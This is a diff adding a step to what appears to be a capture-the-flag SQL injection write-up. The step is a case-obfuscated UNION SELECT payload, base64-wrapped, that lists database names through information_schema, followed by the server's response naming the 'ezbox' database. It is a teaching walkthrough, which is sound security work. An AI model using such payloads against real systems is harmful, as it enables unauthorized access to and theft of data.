@@ -127,6 +127,15 @@ response:
 
 <img width="174" alt="image" src="https://user-images.githubusercontent.com/79740895/208965679-8c116a48-31b5-4c6c-a8d8-d7e39ae5c49a.png">
 
+Now we can try to extract the databases'name, tables'name, columns'name.
+
+Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+
+payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>`
+
+response:
+
+`|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|`
 
 
 
